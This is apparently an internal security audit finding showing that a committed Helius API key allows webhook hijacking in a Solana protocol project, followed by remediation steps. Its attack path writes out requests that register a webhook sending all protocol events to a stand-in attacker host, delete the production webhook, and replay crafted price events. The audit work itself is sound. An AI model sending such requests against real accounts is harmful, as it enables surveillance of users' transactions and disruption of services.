# H004: Helius API Key Enables Webhook Hijack

## Verdict: CONFIRMED

---

## Evidence

### 1. Key is committed to git — in every clone since Phase 91

`.env.devnet` is a tracked file (`git ls-files .env.devnet` returns the path without error). It has been committed since at least commit `a75ee70` (Phase 91-01, the earliest in its log) and is present in all three tracked revisions of the file:

```
a75ee70  feat(91-01): split .env into cluster files...
41b1fe0  feat: Phase 95 full clean devnet deploy...
3f2a35c  feat(97-02): create Squads 2-of-3 multisig...
```

The key has never changed across these commits:

```
HELIUS_API_KEY=[REDACTED-DEVNET-HELIUS-KEY]
CLUSTER_URL=https://devnet.helius-rpc.com/?api-key=[REDACTED-DEVNET-HELIUS-KEY]
```

The key also appears hardcoded in a second tracked file:

- `shared/programs.ts:24` — `"https://devnet.helius-rpc.com/?api-key=[REDACTED-DEVNET-HELIUS-KEY]"`

This key is retrievable from any clone or any public/shared access to the repository across all 1,922 commits of history.

### 2. The key grants full Helius webhook management

`scripts/webhook-manage.ts` demonstrates the attack surface explicitly. It uses `HELIUS_API_KEY` to:

- `GET /webhooks` — enumerate all registered webhooks (reveals production webhook ID and delivery URL)
- `POST /webhooks` — create new webhooks pointing to any attacker URL
- `PUT /webhooks/{id}` — update any existing webhook's delivery URL or auth header
- `DELETE /webhooks/{id}` — delete the production webhook, severing the data pipeline

The script routes to `https://api.helius.xyz/v0` for devnet and `https://api-mainnet.helius-rpc.com/v0` for mainnet. Whether one Helius account/API key spans both clusters depends on Helius's account model (not verified from source), but the exposed key provides at minimum full devnet webhook control.

### 3. The comment actively justifies the exposure

`.env.devnet:3` reads:
```
# This file is committed to git (devnet credentials are non-sensitive).
```

This comment is incorrect as a universal claim. The Helius API key has administrative scope over the Helius account's webhooks regardless of which cluster's RPC it is used to call. "Devnet RPC credential" and "webhook management credential" are not the same thing.

### 4. Mainnet template carries a parallel risk

`app/.env.mainnet:49` instructs:
```
NEXT_PUBLIC_RPC_URL=https://mainnet.helius-rpc.com/?api-key=CHANGE_ME_MAINNET
```

If the same Helius account is used for mainnet (single account with devnet + mainnet projects, or a single API key that spans both), the committed devnet key may already grant access to the mainnet webhook. Even if separate, this template creates a vector for the mainnet key to be baked into the client bundle at build time (a `NEXT_PUBLIC_` var is inlined into JavaScript at Next.js build time).

## Attack Path

**Prerequisites:** Repository read access (GitHub clone, collaborator invite, or any git access).

**Steps:**

1. Clone or read the repository. Extract `[REDACTED-DEVNET-HELIUS-KEY]` from `.env.devnet:8` or `shared/programs.ts:24`.

2. Enumerate registered webhooks:
   ```
   GET https://api.helius.xyz/v0/webhooks?api-key=[REDACTED-DEVNET-HELIUS-KEY]
   ```
   Response reveals: webhook ID(s), delivery URL(s), type, and monitored program addresses.

3a. **Passive surveillance attack:** Register a second webhook on the same account:
   ```
   POST https://api.helius.xyz/v0/webhooks?api-key=[REDACTED-DEVNET-HELIUS-KEY]
   {
     "webhookURL": "https://attacker.xyz/capture",
     "webhookType": "rawDevnet",
     "transactionTypes": ["ANY"],
     "accountAddresses": ["43fZ...", "4Heq..."]
   }
   ```
   Helius now mirrors every protocol event to the attacker. All swap transactions, epoch transitions, VRF events, and Carnage executions are replayed to attacker infrastructure indefinitely and silently.

3b. **Data pipeline disruption attack:** Delete the production webhook:
   ```
   DELETE https://api.helius.xyz/v0/webhooks/{id}?api-key=[REDACTED-DEVNET-HELIUS-KEY]
   ```
   All protocol events stop flowing to the database. Candles stop updating. SSE clients receive no new protocol state. The frontend displays stale data for all users.

3c. **Price manipulation attack (if webhook secret is also compromised):** Redirect the webhook to attacker infrastructure, then replay crafted `TaxedSwap` events with extreme prices to the production endpoint. Because the candle upsert uses `GREATEST`/`LEAST` for high/low, a single crafted event permanently corrupts that candle bucket's high/low values for all chart clients.

**Time to exploit:** Under 5 minutes from reading the key to having surveillance in place.

## Impact

**Severity: HIGH**

| Attack | Confidentiality | Integrity | Availability |
|--------|----------------|-----------|--------------|
| Shadow webhook (passive surveillance) | All protocol on-chain events exposed | None | None |
| Webhook deletion | None | None | Full data pipeline disruption |
| Webhook redirect + candle manipulation | — | Chart data permanently corrupted | — |

**Passive surveillance impact:** Every on-chain swap (amount, direction, wallet), every epoch transition (tax rate change, VRF result), every Carnage execution, and every bonding curve event is replicated to attacker infrastructure. This includes data that front-runs visibility of pending epoch changes to users.

**Data pipeline disruption impact:** The protocol's off-chain data layer (candles, charts, SSE real-time state) goes dark. The on-chain programs continue operating correctly, but the frontend loses all real-time protocol visibility. This is a reputational attack vector at launch.

**Scope:** This is primarily a devnet finding. The devnet Helius key definitively controls the devnet webhook. Whether it also controls the mainnet webhook depends on whether a single Helius account/key is shared between clusters — this cannot be verified from source code alone and requires operator confirmation.

---

## Recommendation

### Immediate (before any further use of this repository)

1. **Rotate the Helius API key.** Log into the Helius dashboard, generate a new key, update `.env.devnet`, `shared/programs.ts`, any Railway env vars, and delete the old key. This invalidates the exposed key.

2. **Audit existing webhooks.** After rotating, run `webhook-manage.ts list` to verify no attacker-created shadow webhooks are registered.

### Short-term

3. **Remove `HELIUS_API_KEY` from `.env.devnet` and `.gitignore` it.** The devnet Helius key should not be in version control regardless of the "devnet is non-sensitive" reasoning. Use a `.env.devnet.template` with placeholder values instead.

4. **Remove the hardcoded key from `shared/programs.ts:24`.** Replace `DEVNET_RPC_URL` with a runtime env var read: `process.env.HELIUS_RPC_URL`. The constant is currently unused by `app/` code (no imports found), but it persists as a tracked exposure vector.

5. **Clarify the mainnet env template.** Remove or annotate `NEXT_PUBLIC_RPC_URL` in `app/.env.mainnet:49`. The RPC proxy pattern makes this var unnecessary for browser use, and setting it with a real key bakes the key into the client bundle permanently.

### Long-term

6. **Adopt webhook signing.** Helius supports HMAC-SHA256 webhook signatures (optional feature). Switch from `authHeader` equality to HMAC body verification. This prevents attacker-controlled Helius webhooks from injecting crafted events even if the shared secret is obtained, because the body is signed.

7. **Separate Helius accounts by environment.** Use a dedicated Helius account (and API key) for devnet testing, separate from the mainnet account. Compromise of the devnet key then has zero blast radius on mainnet.

## Evolution

**Relationship to Audit #1 H131 (Webhook URL Discoverable):** H131 was verified FIXED — `webhook-manage.ts` was updated to require explicit `WEBHOOK_URL` env var rather than defaulting to the production URL. H004 is a distinct issue operating at the API key layer (one level above the webhook URL), and was listed as PARTIALLY_FIXED in Audit #1 in the context of the crank wallet. This finding surfaces the Helius-specific API key attack vector as its own confirmed finding.

**Relationship to H002 (Helius API Key in Client Bundle):** H002 addressed the key being present in the browser JavaScript bundle. That fix (RPC proxy) is intact. H004 is the complementary server-side finding: the key is in the git repository itself, granting webhook management access independent of the client bundle. Both issues require independent remediation.

**Relationship to H001 (Webhook Auth Bypass):** H001 fixed the incoming webhook authentication (fail-closed, timing-safe). H004 operates on Helius's outbound webhook management API — it enables an attacker to create additional webhooks or delete the existing one, bypassing H001's protection entirely by operating at a higher layer.
